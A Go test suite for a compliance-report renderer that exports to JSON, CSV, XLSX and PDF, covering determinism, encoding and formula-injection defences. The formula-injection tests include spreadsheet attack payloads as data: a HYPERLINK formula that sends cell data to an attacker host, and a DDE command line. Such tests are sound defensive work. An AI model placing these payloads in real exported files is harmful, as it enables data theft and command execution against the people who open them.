// Copyright 2026 AxonFlow
// SPDX-License-Identifier: BUSL-1.1

//go:build enterprise

package renderer

import (
	"bytes"
	"crypto/sha256"
	"encoding/csv"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/go-pdf/fpdf"
	"github.com/xuri/excelize/v2"
)

// sampleReport is the single fixture every renderer test uses, so a change in
// one format's expectations cannot silently drift from the others.
//
// It deliberately contains the things that break renderers: a comma, a double
// quote and an embedded newline in cell text; a value that looks numeric but
// must stay a string; a title with a character Excel forbids in a sheet name;
// and a rune outside cp1252.
func sampleReport() *Report {
	return &Report{
		JobID:         "creport-fixture-0001",
		Regulator:     "ojk",
		RegulatorName: "OJK / BI / UU PDP (Indonesia)",
		Framework:     "OJK_AI_GOVERNANCE",
		OrgID:         "id-fintech-org",
		PeriodStart:   time.Date(2026, 4, 1, 0, 0, 0, 0, time.UTC),
		PeriodEnd:     time.Date(2026, 6, 30, 23, 59, 59, 0, time.UTC),
		GeneratedAt:   time.Date(2026, 7, 1, 9, 30, 0, 0, time.UTC),
		ReportState:   "populated",
		RetentionNote: "OJK / UU PDP: records retained 5 years.",
		RecordCount:   3,
		Sections: []Section{
			{
				Key:         "policy_violations",
				Title:       "Policy violations",
				Description: "Governance policy violations recorded in the reporting period.",
				Columns:     []string{"ID", "Timestamp", "Policy", "Severity", "Description"},
				Rows: [][]string{
					{"pv-1", "2026-04-02T10:00:00Z", "pii_block", "high", `Blocked NIK, NPWP and "bank account" patterns`},
					{"pv-2", "2026-05-11T14:22:00Z", "sqli_guard", "critical", "Multi-line\ndescription with a newline"},
					{"pv-0007", "2026-06-01T00:00:00Z", "rate_limit", "low", "Leading zeros must survive"},
				},
				Summary: []KV{{Key: "Severity: high", Value: "1"}, {Key: "Severity: critical", Value: "1"}},
			},
			{
				Key:         "cross_border_transfers",
				Title:       "Cross-border transfers (UU PDP Pasal 56)",
				Description: "Transfers with the legal basis recorded at decision time.",
				Notes:       []string{"No cross-border personal-data transfers were recorded in the reporting period."},
			},
			{
				Key:   "unicode_probe",
				Title: "Nama pengguna",
				// A rune outside cp1252 - the PDF must degrade visibly, and the
				// text formats must carry it through unchanged.
				Columns: []string{"Name"},
				Rows:    [][]string{{"Ravi कुमार"}},
			},
		},
	}
}

// -----------------------------------------------------------------------------
// JSON
// -----------------------------------------------------------------------------

func TestJSONRenderer_GoldenFile(t *testing.T) {
	got, err := NewJSON().Render(sampleReport())
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	assertGolden(t, "report.json", got)

	var envelope struct {
		Schema string  `json:"schema"`
		Report *Report `json:"report"`
	}
	if err := json.Unmarshal(got, &envelope); err != nil {
		t.Fatalf("rendered JSON does not parse: %v", err)
	}
	if envelope.Schema != jsonSchemaID {
		t.Errorf("schema = %q, want %q", envelope.Schema, jsonSchemaID)
	}
	if envelope.Report.RecordCount != 3 {
		t.Errorf("record_count = %d, want 3", envelope.Report.RecordCount)
	}
	// The three-state token must be present as a RAW value, not only as the
	// prose sentence, so a machine consumer never has to parse English.
	if envelope.Report.ReportState != "populated" {
		t.Errorf("report_state = %q, want populated", envelope.Report.ReportState)
	}
	// The non-cp1252 rune must survive intact in a text format.
	if !bytes.Contains(got, []byte("Ravi कुमार")) {
		t.Error("JSON render lost the non-Latin name")
	}
}

// -----------------------------------------------------------------------------
// CSV
// -----------------------------------------------------------------------------

func TestCSVRenderer_GoldenFileAndStrictParse(t *testing.T) {
	got, err := NewCSV().Render(sampleReport())
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	assertGolden(t, "report.csv", got)

	// STRICT parse: FieldsPerRecord is left at its default, so encoding/csv
	// pins the width from the first record and rejects any ragged row. This is
	// the assertion the document-wide padding exists to satisfy, and the one a
	// sectioned CSV fails without it.
	records, err := csv.NewReader(bytes.NewReader(got)).ReadAll()
	if err != nil {
		t.Fatalf("strict CSV parse failed: %v", err)
	}
	if len(records) < 10 {
		t.Fatalf("expected a multi-section document, got %d records", len(records))
	}
	width := len(records[0])
	for i, rec := range records {
		if len(rec) != width {
			t.Fatalf("record %d has %d fields, first record has %d", i, len(rec), width)
		}
	}

	// Round-trip the awkward cell contents.
	joined := flatten(records)
	for _, want := range []string{
		`Blocked NIK, NPWP and "bank account" patterns`,
		"Multi-line\ndescription with a newline",
		"pv-0007",
		"Ravi कुमार",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("CSV lost the value %q", want)
		}
	}
}

func TestCSVRenderer_EmptySectionKeepsItsEmptyStateSentence(t *testing.T) {
	got, err := NewCSV().Render(sampleReport())
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if !bytes.Contains(got, []byte("No cross-border personal-data transfers were recorded")) {
		t.Error("an empty section lost its empty-state sentence - 'no rows' becomes indistinguishable from 'not covered'")
	}
}

// -----------------------------------------------------------------------------
// XLSX
// -----------------------------------------------------------------------------

func TestXLSXRenderer_ProducesAReadableWorkbook(t *testing.T) {
	got, err := NewXLSX().Render(sampleReport())
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	f, err := excelize.OpenReader(bytes.NewReader(got))
	if err != nil {
		t.Fatalf("workbook does not open: %v", err)
	}
	defer func() { _ = f.Close() }()

	sheets := f.GetSheetList()
	if sheets[0] != xlsxCoverSheet {
		t.Errorf("first sheet = %q, want the cover sheet %q", sheets[0], xlsxCoverSheet)
	}
	if len(sheets) != 1+len(sampleReport().Sections) {
		t.Errorf("sheets = %v, want a cover sheet plus one per section", sheets)
	}
	// The forbidden character in "Cross-border transfers (UU PDP Pasal 56)" is
	// none, but the slash in the regulator name would be - assert no sheet name
	// carries an illegal rune.
	for _, s := range sheets {
		if strings.ContainsAny(s, invalidSheetRunes) {
			t.Errorf("sheet name %q contains a character Excel forbids", s)
		}
		if len([]rune(s)) > 31 {
			t.Errorf("sheet name %q exceeds the 31-character limit", s)
		}
	}

	// A value that LOOKS numeric must have landed as text, or leading zeros and
	// long ids are destroyed. Reading it back as the original string is the
	// assertion; a float coercion returns "7".
	found := ""
	for _, sheet := range sheets {
		rows, err := f.GetRows(sheet)
		if err != nil {
			t.Fatalf("GetRows(%s): %v", sheet, err)
		}
		for _, row := range rows {
			for _, cell := range row {
				if cell == "pv-0007" {
					found = cell
				}
			}
		}
	}
	if found != "pv-0007" {
		t.Error("the workbook does not contain the literal cell value pv-0007")
	}
}

// -----------------------------------------------------------------------------
// PDF
// -----------------------------------------------------------------------------

// TestPDFRenderer_StructuralAssertions checks the container, not the pixels.
// Byte-comparing a PDF across platforms is explicitly out of scope (epic #2892
// D2); what must hold is that the file IS a PDF, carries the pinned metadata,
// and paginates.
func TestPDFRenderer_StructuralAssertions(t *testing.T) {
	rep := sampleReport()
	got, err := NewPDF().Render(rep)
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if !bytes.HasPrefix(got, []byte("%PDF-")) {
		t.Fatalf("not a PDF; begins with %q", string(got[:min(40, len(got))]))
	}
	if !bytes.Contains(got, []byte("%%EOF")) {
		t.Error("PDF has no EOF trailer")
	}
	// /CreationDate must be the JOB's timestamp, not the render clock. fpdf
	// writes it as D:YYYYMMDDHHMMSS.
	if !bytes.Contains(got, []byte("D:20260701093000")) {
		t.Error("PDF /CreationDate is not the report's GeneratedAt - it is reading a clock")
	}
	// No random document identifier. fpdf emits an /ID only for an encrypted
	// document, and then a FIXED `[()()]`; these reports are unencrypted, so
	// the trailer must carry no /ID at all. Either shape is deterministic; a
	// random one would silently break the checksum contract.
	if idx := bytes.Index(got, []byte("/ID")); idx >= 0 {
		if !bytes.HasPrefix(got[idx:], []byte("/ID [()()]")) {
			t.Errorf("PDF trailer carries a non-fixed /ID: %q", string(got[idx:min(idx+40, len(got))]))
		}
	}
	if !bytes.Contains(got, []byte("/Type /Pages")) {
		t.Error("PDF has no page tree")
	}
}

// TestPDFRenderer_NoEmojiOrUnrenderableGlyphs pins the honest-degradation rule:
// a rune with no core-font glyph becomes '?', which is visible, rather than
// being dropped, which reads as missing data.
func TestPDFRenderer_NoEmojiOrUnrenderableGlyphs(t *testing.T) {
	if got := sanitizeForCore("Ravi कुमार"); got != "Ravi ?????" {
		t.Errorf("sanitizeForCore = %q, want the Devanagari replaced by visible '?'", got)
	}
	if got := sanitizeForCore("done \U0001F600"); got != "done ?" {
		t.Errorf("sanitizeForCore = %q, want the emoji replaced by '?'", got)
	}
	// Typographic punctuation arrives constantly in pasted policy text and DOES
	// have a cp1252 glyph, so it must survive.
	if got := sanitizeForCore("“quoted” – dash"); got != "“quoted” – dash" {
		t.Errorf("sanitizeForCore flattened cp1252 punctuation: %q", got)
	}
	// Control characters carry no glyph at all and are dropped, not '?'-ed.
	if got := sanitizeForCore("a\x00b\tc\nd"); got != "ab    c d" {
		t.Errorf("sanitizeForCore control handling = %q", got)
	}
}

// -----------------------------------------------------------------------------
// Determinism
// -----------------------------------------------------------------------------

// determinismRenders: see the identical constant in
// platform/orchestrator/rbi/auditexport_render_test.go. Two renders are NOT
// enough - fpdf's /Font dictionary is a Go map with a handful of entries, so a
// broken renderer produces matching bytes by chance a large fraction of the
// time. Verified by mutation: with SetCatalogSort removed this fails on every
// attempt at 6 renders and passed on the first attempt at 2.
const determinismRenders = 6

func TestRenderersAreDeterministic(t *testing.T) {
	for _, tc := range []struct {
		name string
		r    Renderer
	}{
		{"pdf", NewPDF()},
		{"csv", NewCSV()},
		{"xlsx", NewXLSX()},
		{"json", NewJSON()},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var want [32]byte
			for i := 0; i < determinismRenders; i++ {
				// A FRESH report each time: rendering the same pointer twice
				// would also pass if a renderer mutated the model and then
				// re-read its own mutation.
				got, err := tc.r.Render(sampleReport())
				if err != nil {
					t.Fatalf("render %d: %v", i, err)
				}
				sum := sha256.Sum256(got)
				if i == 0 {
					want = sum
					// One wall-clock second between the first and second
					// render: a renderer reading time.Now() anywhere fails.
					time.Sleep(1100 * time.Millisecond)
					continue
				}
				if sum != want {
					t.Fatalf("render %d differs from render 0", i)
				}
			}
		})
	}
}

// TestRenderersRejectANilReport pins that every format agrees on what a nil
// model means, rather than three of them panicking.
func TestRenderersRejectANilReport(t *testing.T) {
	for _, tc := range []struct {
		name string
		r    Renderer
	}{
		{"pdf", NewPDF()}, {"csv", NewCSV()}, {"xlsx", NewXLSX()}, {"json", NewJSON()},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := tc.r.Render(nil); err == nil {
				t.Error("rendering a nil report returned no error")
			}
		})
	}
}

// TestRendererContentTypesAndExtensions pins the metadata the service stores
// alongside the artifact; a wrong Content-Type here becomes a browser that
// cannot open a downloaded report.
func TestRendererContentTypesAndExtensions(t *testing.T) {
	for _, tc := range []struct {
		r   Renderer
		ct  string
		ext string
	}{
		{NewPDF(), "application/pdf", "pdf"},
		{NewCSV(), "text/csv; charset=utf-8", "csv"},
		{NewXLSX(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "xlsx"},
		{NewJSON(), "application/json", "json"},
	} {
		if got := tc.r.ContentType(); got != tc.ct {
			t.Errorf("%s ContentType = %q, want %q", tc.ext, got, tc.ct)
		}
		if got := tc.r.Extension(); got != tc.ext {
			t.Errorf("Extension = %q, want %q", got, tc.ext)
		}
	}
}

// -----------------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------------

// assertGolden compares got against testdata/name, rewriting it under -update.
//
// Golden files are used for the TEXT formats only. PDF and XLSX are binary
// containers whose exact bytes depend on the library version, so pinning them
// would turn a dependency bump into a mystery diff; those two get structural
// assertions plus the determinism check instead (epic #2892 D2).
func assertGolden(t *testing.T, name string, got []byte) {
	t.Helper()
	path := filepath.Join("testdata", name)
	if os.Getenv("UPDATE_GOLDEN") == "1" {
		if err := os.MkdirAll("testdata", 0o755); err != nil {
			t.Fatalf("mkdir testdata: %v", err)
		}
		if err := os.WriteFile(path, got, 0o644); err != nil {
			t.Fatalf("write golden: %v", err)
		}
		t.Logf("updated golden %s", path)
		return
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read golden %s: %v (regenerate with UPDATE_GOLDEN=1 go test ./...)", path, err)
	}
	if !bytes.Equal(got, want) {
		t.Errorf("output differs from golden %s.\n--- got ---\n%s\n--- want ---\n%s", path, got, want)
	}
}

func flatten(records [][]string) string {
	var b strings.Builder
	for _, rec := range records {
		b.WriteString(strings.Join(rec, "\x00"))
		b.WriteByte('\n')
	}
	return b.String()
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// TestRenderersRefuseAZeroGeneratedAt is H2 from the #3241 round-2 record.
//
// fpdf treats a zero time as "unset" and stamps the WALL CLOCK into
// /CreationDate and /ModDate. Measured against the library directly, two renders
// of an identical zero-time report one second apart differ:
//
//	/CreationDate (D:20260803185338)
//	/CreationDate (D:20260803185339)
//
// A checksum that changes on re-render is worth nothing, so the renderers
// refuse rather than substitute. Asserted for EVERY format, not just PDF: a
// report with no generation timestamp is malformed regardless of how it is
// serialized, and a per-format rule would leave the next renderer free to
// invent one.
func TestRenderersRefuseAZeroGeneratedAt(t *testing.T) {
	for _, tc := range []struct {
		name string
		r    Renderer
	}{
		{"pdf", NewPDF()},
		{"csv", NewCSV()},
		{"xlsx", NewXLSX()},
		{"json", NewJSON()},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := sampleReport()
			rep.GeneratedAt = time.Time{}

			out, err := tc.r.Render(rep)
			if err == nil {
				t.Fatalf("rendered %d bytes from a report with no generation timestamp; "+
					"on the PDF path those bytes carry a wall-clock /CreationDate and the checksum "+
					"changes on every re-render", len(out))
			}
			if !errors.Is(err, ErrZeroGeneratedAt) {
				t.Fatalf("got %v, want ErrZeroGeneratedAt", err)
			}
			if out != nil {
				t.Errorf("a refused render returned %d bytes; callers that ignore the error would "+
					"persist them", len(out))
			}
		})
	}
}

// TestZeroGeneratedAtWouldHaveBeenNondeterministic is the evidence for the
// refusal above rather than an assertion about our code: it drives fpdf the way
// the renderer used to and shows the bytes differing.
//
// Without this, "we refuse zero times" is a rule with no demonstrated cause,
// and the next person to find the refusal inconvenient has nothing to weigh.
// Skipped in -short: it sleeps past a one-second clock tick.
func TestZeroGeneratedAtWouldHaveBeenNondeterministic(t *testing.T) {
	if testing.Short() {
		t.Skip("sleeps past a clock tick")
	}
	render := func(ts time.Time) []byte {
		p := fpdf.New("P", "mm", "A4", "")
		p.SetCatalogSort(true)
		p.SetCreationDate(ts.UTC())
		p.SetModificationDate(ts.UTC())
		p.AddPage()
		p.SetFont("Arial", "", 12)
		p.Cell(40, 10, "x")
		var b bytes.Buffer
		if err := p.Output(&b); err != nil {
			t.Fatalf("fpdf output: %v", err)
		}
		return b.Bytes()
	}

	// CONTROL FIRST: a real timestamp must be stable across the same tick
	// boundary, or this test proves nothing about the zero value specifically.
	fixed := time.Date(2026, 4, 1, 12, 0, 0, 0, time.UTC)
	c1 := render(fixed)
	time.Sleep(1100 * time.Millisecond)
	c2 := render(fixed)
	if !bytes.Equal(c1, c2) {
		t.Fatalf("a FIXED GeneratedAt is already nondeterministic across a clock tick - "+
			"this test cannot attribute anything to the zero value (len %d vs %d)", len(c1), len(c2))
	}

	z1 := render(time.Time{})
	time.Sleep(1100 * time.Millisecond)
	z2 := render(time.Time{})
	if bytes.Equal(z1, z2) {
		t.Skip("fpdf no longer substitutes the wall clock for a zero time; the refusal is now belt-and-braces")
	}
}

// TestFormulaInjectionIsNeutralized is M6 of the #3241 round-2 record.
//
// A compliance report is built from tenant-controlled strings and is then
// opened by a regulator in a spreadsheet, where a cell starting with =, +, -
// or @ is EXECUTED. The table covers the attack shapes and, just as
// importantly, the values that must NOT be touched: neutralizing a negative
// number would turn a real numeric column into text with a visible apostrophe,
// which corrupts the evidence this function exists to protect.
func TestFormulaInjectionIsNeutralized(t *testing.T) {
	for _, tc := range []struct {
		name string
		in   string
		want string
	}{
		// Attacks.
		{"hyperlink exfiltration", `=HYPERLINK("https://x.example/?d="&A1,"details")`, `'=HYPERLINK("https://x.example/?d="&A1,"details")`},
		{"DDE command", `=cmd|'/c calc'!A0`, `'=cmd|'/c calc'!A0`},
		{"plus-led formula", `+1+1`, `'+1+1`},
		{"at-led (Lotus-style)", `@SUM(A1:A9)`, `'@SUM(A1:A9)`},
		{"minus-led formula", `-1+1`, `'-1+1`},
		{"leading tab hides the marker", "\t=1+1", "'\t=1+1"},
		{"leading spaces", "   =1+1", "'   =1+1"},
		{"leading CR", "\r=1+1", "'\r=1+1"},

		// Values that must survive untouched.
		{"negative integer", "-5", "-5"},
		{"negative decimal", "-12.5", "-12.5"},
		{"explicitly signed", "+7", "+7"},
		{"exponent", "-1.5e-3", "-1.5e-3"},
		{"plain text", "policy blocked the call", "policy blocked the call"},
		{"empty", "", ""},
		{"whitespace only", "   ", "   "},
		{"hash preamble", "# Report ID", "# Report ID"},
		{"email", "reviewer@acme.com", "reviewer@acme.com"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := NeutralizeCSVCell(tc.in); got != tc.want {
				t.Errorf("NeutralizeCSVCell(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

// TestFormulaInjectionIsNeutralizedInRenderedArtifacts drives the REAL
// renderers, because a helper that behaves correctly in isolation and is not
// wired into the write path protects nothing.
func TestFormulaInjectionIsNeutralizedInRenderedArtifacts(t *testing.T) {
	const attack = `=HYPERLINK("https://attacker.example/?d="&A1,"Click")`

	hostile := func() *Report {
		rep := sampleReport()
		rep.Sections = append(rep.Sections, Section{
			Key:     "hostile",
			Title:   "Hostile input",
			Columns: []string{"Policy", "Count"},
			Rows:    [][]string{{attack, "-5"}},
		})
		return rep
	}

	t.Run("csv", func(t *testing.T) {
		out, err := NewCSV().Render(hostile())
		if err != nil {
			t.Fatalf("render: %v", err)
		}
		body := string(out)
		if !strings.Contains(body, `'=HYPERLINK`) {
			t.Errorf("the CSV does not carry the neutralized form; a spreadsheet would execute it:\n%s", body)
		}
		// The negative number must NOT have been quoted.
		if strings.Contains(body, `'-5`) {
			t.Error("a negative number was neutralized - the numeric column is now text in the auditor's spreadsheet")
		}
	})

	// XLSX must store the value UNCHANGED. This is the inverse assertion of the
	// CSV one above, and it is here so that "add neutralization to XLSX too"
	// fails rather than silently corrupting the artifact: a cell written
	// through SetCellStr is a shared STRING (`<c t="s">`), an XLSX formula
	// lives in an `<f>` element nothing here emits, so there is nothing to
	// defend against and an apostrophe would be visible in an auditor's data.
	t.Run("xlsx stores the value verbatim", func(t *testing.T) {
		out, err := NewXLSX().Render(hostile())
		if err != nil {
			t.Fatalf("render: %v", err)
		}
		f, err := excelize.OpenReader(bytes.NewReader(out))
		if err != nil {
			t.Fatalf("open workbook: %v", err)
		}
		defer func() { _ = f.Close() }()

		var found bool
		for _, sheet := range f.GetSheetList() {
			rows, err := f.GetRows(sheet)
			if err != nil {
				t.Fatalf("read sheet %s: %v", sheet, err)
			}
			for _, row := range rows {
				for _, cell := range row {
					if strings.Contains(cell, "HYPERLINK") {
						found = true
						if cell != attack {
							t.Errorf("the workbook altered the stored value.\n got: %q\nwant: %q\n"+
								"A leading apostrophe here is a VISIBLE character, not a quote-prefix flag, "+
								"and the cell was never evaluated as a formula in the first place.", cell, attack)
						}
					}
				}
			}
		}
		if !found {
			t.Fatal("the hostile value is not in the workbook at all - this test would pass vacuously")
		}
	})
}
